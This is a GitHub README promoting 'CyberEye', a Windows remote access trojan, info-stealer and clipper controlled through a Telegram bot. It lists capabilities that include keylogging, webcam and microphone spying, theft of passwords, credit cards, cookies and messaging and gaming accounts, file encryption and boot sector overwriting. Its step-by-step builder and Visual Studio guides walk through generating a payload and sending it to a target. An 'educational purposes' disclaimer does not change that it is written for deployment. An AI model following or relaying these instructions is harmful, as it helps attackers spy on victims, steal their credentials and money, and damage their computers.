# 👁️ CyberEye (RAT + STEALER + CLIPPER)
Modded Program for remote control of windows computers via telegram bot. Written in C#
<p align="center">
  <img src="images/logo.jpg">
</p>
<div id="badges" align="center">
  <a href="https://t.me/CodQu">
    <img src="https://img.shields.io/badge/Telegram-blue?style=for-the-badge&logo=telegram&logoColor=white" alt="LinkedIn Badge"/>
  </a>
    <a href="https://t.me/Cisamu">
    <img src="https://img.shields.io/badge/Join%20My%20Telegram%20Channel-blue?style=for-the-badge&logo=telegram&logoColor=white" alt="LinkedIn Badge"/>
  </a>
</div>

### LEGAL DISCLAIMER PLEASE READ!
##### I, the creator and all those associated with the development and production of this program are not responsible for any actions and or damages caused by this software. You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only. This software's intended purpose is NOT to be used maliciously, or on any system that you do not have own or have explicit permission to operate and use this program on. By using this software, you automatically agree to the above.

# :fallen_leaf: Original Functions:
ComputerInfo, BatteryInfo, Location, Whois, ActiveWindow, Webcam, Microphone, Desktop, Keylogger, ClipboardSet, ClipboardGet, ProcessList, ProcessKill, ProcessStart, TaskManagerDisable, TaskManagerEnable, MinimizeAllWindows, MaximizeAllWindows, GetPasswords, GetCreditCards, GetHistory, GetBookmarks, GetCookies, GetDesktop, GetFileZilla, GetDiscord, GetTelegram, GetSteam, OpenCD, CloseCD, DownloadFile, UploadFile, RunFile, RunFileAdmin, ListFiles, RemoveFile, RemoveDir, MoveFile, MoveDir, CopyFile, CopyDir, Speak, Shell, MessageBox, OpenURL, SendKeyPress, NetDiscover, AudioVolumeSet, AudioVolumeGet, SetWallPaper, BlockInput, Monitor(off/on), DisplayRotate, EncryptFileSystem, DecryptFileSystem,ForkBomb, BsoD, OverwriteBootSector, Shutdown, Reboot, Hibernate, Logoff, Help, About, Uninstall.

# Ⓜ Modded Functions:
AssemblyInfoChanging(config.cs), Beep, Cycle, Tray, SetRandomCurPos, Compiler, DirOrFile, Wifi_Steal, Regedit, Windefender, Cmd, SystemRestore, ScreenResolution, isAdmin, BugReport, Minecraft, CamList, MonitorList.
# :hammer: Compiling guide using Builder:  

* Go to the [@BotFather](https://t.me/BotFather) bot and create your own bot. You need to save the token and bot name.  
  ![](images/createBot.JPG)  
* Now you need to get your chat id. To do this, go to the next bot [@chatid_echo_bot](https://t.me/chatid_echo_bot) and save the id.  
  ![](images/chatidBot.JPG)  
* Now you need to download [Latest stable release](https://github.com/cisamu123/CyberEye/releases)  
  ![](images/DownloadAndUnzipBuilder.jpg)  
* After downloading the `.zip` archive, extract it to any folder on your system.  
* Inside the extracted folder, run the file `CyberEye.Client.Builder.exe`  
  ![](images/ExecuteBuilder.jpg)
* ⚠️ **Important:** Make sure to also move the entire `Stub` folder (included in the archive) to the **same directory** as the Builder.  
  Without the `Stub` folder in the correct location, the builder will not be able to generate the final payload.
* In the builder, fill in the required fields:  
  - **Bot Token** (from [@BotFather](https://t.me/BotFather))  
  - **Chat ID** (from [@chatid_echo_bot](https://t.me/chatid_echo_bot))  
  - Enable optional features using checkboxes (e.g., Autorun, BSOD Protection, etc.)

* Click **Build**, then choose where to save the final `.exe` payload.
  ![](images/BuilderBuild.jpg)

✅ That’s it — no need to touch Visual Studio. Just fill, click, and deploy!
* You can send the generated .exe payload to your target machine.  
* After starting the file, you can control the computer through the bot.  
  ![](images/openMalware.JPG)  
* Write `/help` to see all available commands.  
### **This release introduces a new standalone payload builder for CyberEye RAT, enabling users to generate customized payloads with ease.**

## 🔑 Key Features

> Creating and customizing your own RAT has never been easier.  
> With the new **Builder**, you no longer need to open Visual Studio, manually edit config files, or compile the project yourself.  
> Simply run the Builder, fill in your desired options, and generate a fully working stub with just one click.

### 🧱 Builder Highlights
- **No coding required** – Everything is done through a user-friendly GUI.
- **Instant build** – Generates a ready-to-use executable without needing Visual Studio or any compiler setup.
- **Secure Telegram Integration** – Easily input your bot token and chat ID.
- **Fully configurable** – Set all options directly from the Builder (admin rights, startup behavior, delay, wallet stealer, etc.).

---

> Developed by **Cisamu**  
> Now enhanced with an easy-to-use Builder to streamline your workflow.

# :hammer: Alternative (OLD) Compiling guide using Visual Studio:  
* Go to the [@BotFather](https://t.me/BotFather) bot and create your own bot. You need to save the token and bot name.  
  ![](images/createBot.JPG)  
* Now you need to get your chat id. To do this, go to the next bot [@chatid_echo_bot](https://t.me/chatid_echo_bot) and save the id.  
  ![](images/chatidBot.JPG)  
* Now you need to download [Visual Studio](https://visualstudio.microsoft.com/en/vs/)  
  ![](images/vs.JPG)  
* Download the [source code](https://github.com/cisamu123/CyberEye/archive/refs/heads/main.zip) of this program.  
  ![](images/loadSourceCode.JPG)  
* Unzip the “Telegram RAT” folder to your desktop.
* Open the TelegramRAT.sln file through Visual Studio.
* Open file config.cs in project.  
  ![](images/openConfig.JPG)  
* Insert your token from the bot and your chatID that you received earlier.  
* Above you need to select ”Release”.  
  ![](images/saveConfig.JPG)  
* Press CTRL + S to save. And CTRL + B to compile everything into an executable file.  
  ![](images/build.JPG)   
* You can send the received file to someone.  
* After starting the file, you can control the computer through the bot.  
  ![](images/openMalware.JPG)  
* Write `/help` to see all available commands.  

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=cisamu123/CyberEye&type=Date)](https://star-history.com/#cisamu123/CyberEye&Date)

# :moneybag: Donate:
**BTC:** `bc1q5exw2v9sa0yktp2t7xnq8ma2xpn5a29s7w283y`  
**ETH:** `0x8d797249170d263B959A3c688D8456adBcfBC319`  
**XMRT:** `0xF978FE35d00A201eB48aB3908993e14f312001a2`  

<h1><a href = "https://github.com/LimerBoy/ToxicEye">👽 ORIGINAL RAT VERSION</a></h1>
